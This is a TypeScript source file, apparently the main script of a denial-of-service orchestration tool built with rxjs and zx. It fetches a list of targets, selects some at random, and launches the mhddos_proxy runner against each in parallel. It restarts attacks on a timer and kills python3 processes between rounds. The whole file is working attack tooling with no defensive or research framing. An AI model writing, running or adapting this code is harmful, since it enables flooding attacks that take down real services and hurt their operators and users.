import {
  auditTime,
  concat,
  defer,
  finalize,
  from,
  fromEvent,
  merge,
  Observable,
  repeat,
  switchMap,
  takeUntil,
  tap,
  timer,
} from 'rxjs';
import { $, chalk, ProcessOutput, quiet } from 'zx';
import { ParsedArguments } from './arguments/arguments';
import { parseArguments } from './arguments/parse-arguments';
import { exit, exit$ } from './exit';
import { fetchTargets } from './targets/fetch-targets';
import { getRandomTargets } from './targets/get-random-targets';
import { logWithTimePrefix } from './utils/log-with-time-prefix';

const ctrlC$ = fromEvent(process, 'SIGINT').pipe(
  tap(() => {
    // empty line after ^C
    console.log('');
    exit(2);
  }),
);

merge(
  ctrlC$,
  parseArguments().pipe(
    // for any error happening during parsing to have time to complete the stream
    auditTime(0),
    switchMap(startAttacks),
  ),
)
  .pipe(takeUntil(exit$))
  .subscribe();

function startAttacks({ parallel, restartInterval, mhddosFlags }: ParsedArguments): Observable<ProcessOutput> {
  return fetchTargets().pipe(
    getRandomTargets(parallel),
    switchMap((targets) =>
      concat(
        merge(...targets.map((target) => attackTarget(target, restartInterval, mhddosFlags))).pipe(
          takeUntil(timer(restartInterval)),
        ),
        cleanUpAttacks(),
      ),
    ),
    finalize(() => {
      logWithTimePrefix('Stopped attacks');
    }),
    repeat(),
  );
}

function attackTarget(target: string, restartInterval: number, flags: string[]): Observable<ProcessOutput> {
  return defer(() => {
    logWithTimePrefix(chalk(`Starting attack on: ${target}`));

    const processOutput = $`cd /mhddos_proxy && python3 runner.py ${target.split(' ')} ${flags}`;

    return from(processOutput).pipe(
      finalize(async () => {
        await processOutput.kill('SIGTERM');
      }),
    );
  });
}

function cleanUpAttacks(): Observable<ProcessOutput> {
  return defer(() => quiet($`pkill python3`));
}
